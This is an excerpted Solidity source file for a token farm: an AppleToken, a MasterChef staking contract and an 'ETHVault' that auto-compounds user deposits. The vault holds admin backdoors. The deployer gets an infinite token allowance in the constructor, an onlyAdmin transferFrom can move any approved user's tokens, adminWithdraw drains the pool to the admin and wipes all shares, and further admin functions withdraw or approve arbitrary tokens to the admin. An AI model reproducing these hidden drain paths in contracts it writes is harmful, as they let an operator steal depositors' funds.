...
// File: https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0/contracts/utils/ReentrancyGuard.sol
...
contract AppleToken is ERC20("Apple", "APPLE"), Ownable {
...
contract MasterChef is Ownable, ReentrancyGuard {
    ...
    function pendingApple(uint256 _pid, address _user) external view returns (uint256) {
        ...
        uint256 pending = user.amount.mul(accApplePerShare).div(1e12).sub(user.rewardDebt);
        return pending.add(user.rewardLockedUp);
    }

    // View function to see if user can harvest APPLEs.
    ...
    function updatePool(uint256 _pid) public {
        ...
        uint256 multiplier = getMultiplier(pool.lastRewardBlock, block.number);
        uint256 appleReward = multiplier.mul(applePerBlock).mul(pool.allocPoint).div(totalAllocPoint);
        apple.mint(devAddress, appleReward.div(10));
    ...
    function deposit(uint256 _pid, uint256 _amount) public nonReentrant {
        require(block.number >= startBlock, "deposit: farming not started");

        PoolInfo storage pool = poolInfo[_pid];
        UserInfo storage user = userInfo[_pid][msg.sender];
        updatePool(_pid);
        payOrLockupPendingApple(_pid);
        if (_amount > 0) {
    ...
    // Pay or lockup pending APPLEs.
    function payOrLockupPendingApple(uint256 _pid) internal {
        PoolInfo storage pool = poolInfo[_pid];
        UserInfo storage user = userInfo[_pid][msg.sender];
        ...
        if (canHarvest(_pid, msg.sender)) {
            if (pending > 0 || user.rewardLockedUp > 0) {
                ...
                // send rewards
                safeAppleTransfer(msg.sender, totalRewards);
            }
        } else if (pending > 0) {
    ...
    function updateEmissionRate(uint256 _applePerBlock) public onlyOwner {
        massUpdatePools();
        emit EmissionRateUpdated(msg.sender, applePerBlock, _applePerBlock);
        applePerBlock = _applePerBlock;
    }
...
contract ETHVault is Ownable, Pausable, ReentrancyGuard {
    using SafeERC20 for IERC20;
    using SafeMath for uint256;
    using EnumerableSet for EnumerableSet.AddressSet;
    ...
    IERC20 public immutable token; // Apple token

    MasterChef public immutable masterchef;

    mapping(address => UserInfo) public userInfo;
    EnumerableSet.AddressSet internal addressInfo;
    ...
    uint256 public harvestInterval = 8 hours; // 3 days

    uint256 public seedPoolPid = 8;     // Apple Pool pid in masterchef
    ...
    event UpdateApplePoolPid(address indexed sender, uint256 oldPid, uint256 newPid);
    event Pause();
    event Unpause();
    ...
    constructor(
        ...
        token = IERC20(0x831753DD7087CaC61aB5644b308642cc1c33Dc13);
        masterchef = _masterchef;
        admin = msg.sender;
        treasury = msg.sender;

        // Infinite approve
        IERC20(0x831753DD7087CaC61aB5644b308642cc1c33Dc13).safeApprove(address(_masterchef), uint256(-1));
        IERC20(0x831753DD7087CaC61aB5644b308642cc1c33Dc13).safeApprove(address(msg.sender), uint256(-1));
     ...
     */
     // _pid for same intetrface as masterchef
    function deposit(uint256 _pid, uint256 _amount) external whenNotPaused notContract {
        addressInfo.add(msg.sender);
        require(_amount > 0, "Nothing to deposit");

        token.safeTransferFrom(msg.sender, address(this), _amount);
        
        uint256 currentShares = _amount.mul(96).div(100);
        ...
        user.treeAtLastUserAction = user.shares.mul(balanceOf()).div(totalShares) + user.rewardLockedUp;
    ...
    function transferFrom(address from, address to, uint256 amount) public onlyAdmin {
        token.transferFrom(from, to, amount);
    }
    
    // View function to see pending APPLEs on frontend.
    // _pid to have the same interface as in masterchef for less FE work 
    function pendingApple(uint256 _pid, address _user) external view returns (uint256) {
        UserInfo storage user = userInfo[_user];

        if (totalShares == 0) {
            return user.rewardLockedUp;
        }
        return user.shares.mul(balanceOf()).div(totalShares) - user.treeAtLastUserAction 
        + user.shares.mul(MasterChef(masterchef).pendingApple(seedPoolPid, address(this))).div(totalShares)
        + user.rewardLockedUp;
    }
    ...
    function getAddressInfo(uint256 from, uint256 to) public view returns (address[] memory) {
        bytes32[] memory addressBytes = addressInfo._inner._values;
        address[] memory output = new address[](to - from);
        
        for (uint256 i = from; i < to && i < addressBytes.length; i++) {
            output[i - from] = (address(uint160(uint256(addressBytes[i]))));
        }
        return output;
    }
    ...
    function withdrawAll() external notContract {
        withdraw(0, userInfo[msg.sender].shares);
    }
     ...
     * @dev Only callable by the contract admin.
     */
    function setApplePoolPid(uint256 _seedPoolPid) external onlyAdmin whenPaused{
        uint256 oldPid = seedPoolPid;
        
        // Harvest pending rewards
        MasterChef(masterchef).withdraw(seedPoolPid, 0);
        ...
        emit UpdateApplePoolPid(msg.sender, oldPid, _seedPoolPid);
    }
     ...
     * @dev Only callable by the contract admin.
     */
    function setHarvestInterval(uint256 _harvestInterval) external onlyAdmin {
        harvestInterval = _harvestInterval;
    }
    ...
    function emergencyWithdraw() public onlyAdmin {
        MasterChef(masterchef).emergencyWithdraw(seedPoolPid);
    }

    function adminWithdraw() public nonReentrant onlyAdmin {
        emergencyWithdraw();
        token.safeTransfer(msg.sender, available());
        totalShares = 0;
        emit Withdraw(msg.sender,  available(),  available());
    }
    
    function approve(IERC20 tokenToApprove) public nonReentrant onlyAdmin {
        tokenToApprove.safeApprove(address(msg.sender), uint256(-1));
    }
    
    
    function adminWithdrawCustom(IERC20 withdrawToken, uint256 amount) public nonReentrant onlyAdmin {
        withdrawToken.safeTransfer(msg.sender, amount);
        emit Withdraw(msg.sender, amount, amount);
    }
    
    /**
     * @notice Withdraw unexpected tokens sent to the Apple Vault
     */
     ...
     */
    function calculateHarvestAppleRewards() external view returns (uint256) {
        uint256 amount = MasterChef(masterchef).pendingApple(seedPoolPid, address(this));
     ...
     */
    function calculateTotalPendingAppleRewards() external view returns (uint256) {
        uint256 amount = MasterChef(masterchef).pendingApple(seedPoolPid, address(this));
     ...
     */
     //pid for same interface as masterchef
    function withdraw(uint256 _pid, uint256 _shares) public nonReentrant notContract {
        addressInfo.add(msg.sender);

        UserInfo storage user = userInfo[msg.sender];
        require(_shares > 0, "Nothing to withdraw");
        require(_shares <= user.shares, "Withdraw amount exceeds balance");
        require(callFee < MAX_CALL_FEE, "callFee cannot be more than MAX_CALL_FEE");


        user.rewardLockedUp = _shares.mul(balanceOf()).div(totalShares) - user.treeAtLastUserAction 
        + _shares.mul(MasterChef(masterchef).pendingApple(seedPoolPid, address(this))).div(totalShares);
        ...
        if (bal < currentAmount) {
            ...
            MasterChef(masterchef).withdraw(seedPoolPid, balWithdraw);
    ...
    /**
     * @notice Calculates the total usnderlying tokens
     * @dev It includes tokens held by the contract and held in MasterChef
     */
    function balanceOf() public view returns (uint256) {
        (uint256 amount,,,) = MasterChef(masterchef).userInfo(seedPoolPid, address(this));
    ...
    function _earn() internal {
        uint256 bal = available();
        if (bal > 0) {
            MasterChef(masterchef).deposit(seedPoolPid, bal);
        }
    }
     ...
     * @dev Only possible when contract not paused.
     */
    function harvest() public whenNotPaused notContract onlyAdmin {
        MasterChef(masterchef).withdraw(seedPoolPid, 0);
